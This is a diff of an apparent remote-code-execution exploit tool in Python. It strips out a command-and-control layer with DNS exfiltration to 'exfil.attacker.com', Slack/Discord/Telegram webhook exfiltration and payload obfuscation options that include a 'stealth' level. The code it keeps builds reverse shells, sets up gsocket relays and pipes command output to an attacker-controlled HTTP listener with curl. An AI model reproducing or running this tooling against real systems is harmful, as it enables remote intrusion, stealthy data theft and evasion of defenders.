@@ -36,16 +36,6 @@ from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 
-# ─── C2 Method Infrastructure (optional imports - graceful fallback if missing) ────
-try:
-    from c2_methods import C2Registry, C2Method, TCPReverseShell, HTTPCallback, DNSExfiltration, WebSocketCallback
-    from c2_fallback import C2FallbackChain, C2MethodAnalyzer
-    from c2_obfuscator import PayloadObfuscator, ObfuscationProfile
-    from c2_verifier import CommandVerifier, ExecutionTracker, FailureDetection
-    _C2_AVAILABLE = True
-except ImportError:
-    _C2_AVAILABLE = False
-
 # ─── Zero-dependency TUI primitives (stdlib only, no pip required) ───────
 _IS_TTY = sys.stdout.isatty()
 def _c(code: str) -> str:
@@ -1816,52 +1806,6 @@ def run_interactive():
                 print(f"{_RED}Invalid target{_RST}")
                 continue
             host, port, vhost, use_ssl = parsed
-            
-            # ─── C2 Method Selection (if available) ────
-            c2_method_name = None
-            c2_payload_processor = None
-            if _C2_AVAILABLE:
-                c2_choice = _ask(
-                    "Output capture method",
-                    choices=["direct", "dns", "http", "gsocket", "l2relay", "slack", "discord", "webhook"],
-                    default="direct",
-                )
-                if c2_choice == "dns":
-                    from c2_methods import DNSExfiltration
-                    dns_server = _ask("DNS server IP", default="8.8.8.8")
-                    domain = _ask("Domain for exfiltration", default="exfil.attacker.com")
-                    from c2_obfuscator import ObfuscationProfile
-                    obf_level = _ask("Obfuscation", choices=["none", "light", "medium", "heavy"], default="light")
-                    def c2_processor(cmd):
-                        method = DNSExfiltration(dns_server=dns_server, domain=domain)
-                        payload = method.generate_payload(cmd, dns_server=dns_server, domain=domain)
-                        if obf_level != "none":
-                            if obf_level == "light":
-                                payload = ObfuscationProfile.light_obfuscation(payload)
-                            elif obf_level == "medium":
-                                payload = ObfuscationProfile.medium_obfuscation(payload)
-                            elif obf_level == "heavy":
-                                payload = ObfuscationProfile.heavy_obfuscation(payload)
-                        return payload
-                    c2_payload_processor = c2_processor
-                    c2_method_name = "dns"
-                elif c2_choice == "slack":
-                    webhook_url = _ask("Slack webhook URL")
-                    from c2_methods import SlackWebhook
-                    from c2_obfuscator import ObfuscationProfile
-                    def c2_processor(cmd):
-                        method = SlackWebhook(webhook_url=webhook_url)
-                        payload = method.generate_payload(cmd, webhook_url=webhook_url)
-                        return payload
-                    c2_payload_processor = c2_processor
-                    c2_method_name = "slack"
-                elif c2_choice == "webhook":
-                    webhook_url = _ask("Webhook URL (Slack/Discord/Telegram)")
-                    from c2_obfuscator import ObfuscationProfile
-                    def c2_processor(cmd):
-                        return f"curl -X POST '{webhook_url}' -d '{{\"text\":\"$({cmd})\"}}'"
-                    c2_payload_processor = c2_processor
-            
             use_shell = _confirm("Use reverse shell?", default=False)
 
             cb_method:    str = "none"
@@ -1912,12 +1856,11 @@ def run_interactive():
                     cmd = build_reverse_shell_cmd(lhost, lport)
             else:
                 cmd = _ask("Command", default="id")
-                if not c2_payload_processor:  # If C2 not already selected, offer callback
-                    cb_method = _ask(
-                        "Capture output via",
-                        choices=["none", "gsocket", "http"],
-                        default="gsocket",
-                    )
+                cb_method = _ask(
+                    "Capture output via",
+                    choices=["none", "gsocket", "http"],
+                    default="gsocket",
+                )
                 if cb_method == "gsocket":
                     gs_secret    = _ask("GSocket secret (blank = auto-generate)", default="")
                     gs_relay_str = _ask("GSRN relay", default=f"{GSRN_HOST}:{GSRN_PORT}")
@@ -1956,11 +1899,6 @@ def run_interactive():
                     _cb_ready.wait(5)
                     log(f"HTTP callback listener on :{cb_port}", "ok")
                     cmd = f"{cmd} | curl -sm5 -d @- http://{cb_ip}:{cb_port}/rce"
-
-            # ─── Apply C2 Payload Processor ────
-            if c2_payload_processor:
-                cmd = c2_payload_processor(cmd)
-                print(f"{_GRN}Command prepared with C2 method: {c2_method_name}{_RST}")
 
             if use_shell and not l2_mode:
                 _t = threading.Thread(target=run_shell_listener, args=(lport,), daemon=True)
@@ -2132,75 +2070,6 @@ def run_interactive():
 
 
 # ═══════════════════════════════════════════════════════════════════════
-# C2 INTEGRATION HELPERS
-# ═══════════════════════════════════════════════════════════════════════
-
-def _prepare_c2_method(args) -> tuple | None:
-    """
-    Prepare C2 method based on CLI args. Returns (method, payload_processor).
-    
-    Args:
-        args: argparse Namespace with c2/obfuscate/verify flags
-        
-    Returns:
-        Tuple of (c2_method_instance, cmd_wrapper_function) or None
-    """
-    if not _C2_AVAILABLE or not args.c2:
-        return None
-    
-    try:
-        c2_method = None
-        
-        if args.c2 == "tcp":
-            c2_method = TCPReverseShell(lhost=args.lhost, lport=args.lport)
-        elif args.c2 == "http" and args.callback_ip:
-            c2_method = HTTPCallback()
-        elif args.c2 == "dns" and args.c2_dns_server:
-            from c2_methods import DNSExfiltration
-            c2_method = DNSExfiltration(dns_server=args.c2_dns_server, domain=args.c2_domain)
-        elif args.c2 == "slack" and args.c2_webhook:
-            from c2_methods import SlackWebhook
-            c2_method = SlackWebhook(webhook_url=args.c2_webhook)
-        elif args.c2 == "discord" and args.c2_webhook:
-            from c2_methods import DiscordWebhook
-            c2_method = DiscordWebhook(webhook_url=args.c2_webhook)
-        elif args.c2 == "telegram" and args.c2_webhook:
-            from c2_methods import TelegramBot
-            c2_method = TelegramBot(webhook_url=args.c2_webhook)
-        elif args.c2 == "auto" and args.c2_fallback:
-            # Will use fallback chain instead
-            return ("fallback", None)
-        
-        if not c2_method:
-            return None
-        
-        # Build payload processor that applies obfuscation & verification
-        def process_payload(cmd: str) -> str:
-            # Apply verification wrapping
-            if args.verify:
-                cmd = CommandVerifier.wrap_with_markers(cmd)
-            
-            # Apply obfuscation
-            if args.obfuscate and _C2_AVAILABLE:
-                if args.obfuscate == "light":
-                    cmd = ObfuscationProfile.light_obfuscation(cmd)
-                elif args.obfuscate == "medium":
-                    cmd = ObfuscationProfile.medium_obfuscation(cmd)
-                elif args.obfuscate == "heavy":
-                    cmd = ObfuscationProfile.heavy_obfuscation(cmd)
-                elif args.obfuscate == "stealth":
-                    cmd = ObfuscationProfile.stealth_obfuscation(cmd)
-            
-            return cmd
-        
-        return (c2_method, process_payload)
-    
-    except Exception as e:
-        log(f"C2 setup failed: {e}", "err")
-        return None
-
-
-# ═══════════════════════════════════════════════════════════════════════
 # CLI ARGUMENT PARSER
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -2320,25 +2189,6 @@ Option 3 — Direct Reverse Shell (port is auto-freed before binding):
     p.add_argument("-j", "--json", action="store_true", help="JSON output mode")
     p.add_argument("--verbose", "-v", action="store_true", help="verbose output")
 
-    # ─── C2 Method Selection & Obfuscation (if available) ────
-    if _C2_AVAILABLE:
-        p.add_argument("--c2", metavar="METHOD", 
-                       choices=["tcp", "http", "dns", "icmp", "ws", "slack", "discord", "telegram", "gsocket", "l2relay", "auto"],
-                       help="C2 method for RCE (auto=fallback chain)")
-        p.add_argument("--c2-url", metavar="URL", help="C2 callback URL")
-        p.add_argument("--c2-webhook", metavar="URL", help="Webhook URL (Slack/Discord/Telegram)")
-        p.add_argument("--c2-dns-server", metavar="IP", help="DNS server for DNS exfiltration")
-        p.add_argument("--c2-domain", metavar="DOMAIN", default="exfil.attacker.com", help="Domain for DNS exfil")
-        p.add_argument("--c2-timeout", type=int, default=120, help="C2 listener timeout (default: 120s)")
-        p.add_argument("--c2-fallback", action="store_true", help="Enable auto-fallback between C2 methods")
-        p.add_argument("--obfuscate", metavar="LEVEL", 
-                       choices=["light", "medium", "heavy", "stealth"],
-                       help="Payload obfuscation level")
-        p.add_argument("--verify", action="store_true", help="Enable command execution verification")
-        p.add_argument("--verify-method", metavar="METHOD",
-                       choices=["markers", "checksum", "size"],
-                       default="markers", help="Verification method")
-
     return p
 
 
@@ -2435,22 +2285,6 @@ def main():
         if not cmd:
             print("--exploit requires --cmd, --shell, or --l2relay")
             return 1
-
-        # ─── C2 Integration ────────────────────────────────────────
-        _c2_result = _prepare_c2_method(args)
-        if _c2_result:
-            if _c2_result[0] == "fallback" and _C2_AVAILABLE:
-                # Use fallback chain for auto C2 selection
-                from c2_methods import C2Registry
-                fallback_methods = [C2Registry.get(m)() for m in ["dns", "tcp", "slack"] if C2Registry.get(m)]
-                from c2_fallback import C2FallbackChain
-                chain = C2FallbackChain(fallback_methods)
-                log("C2 Fallback chain enabled (dns → tcp → slack)", "info")
-            else:
-                c2_method, payload_processor = _c2_result
-                if payload_processor:
-                    cmd = payload_processor(cmd)
-                    log(f"Command prepared with C2 method: {args.c2}", "ok")
 
         _gs_receiver: GSocketCallbackReceiver | None = None
         _cb_state:    CallbackState | None = None
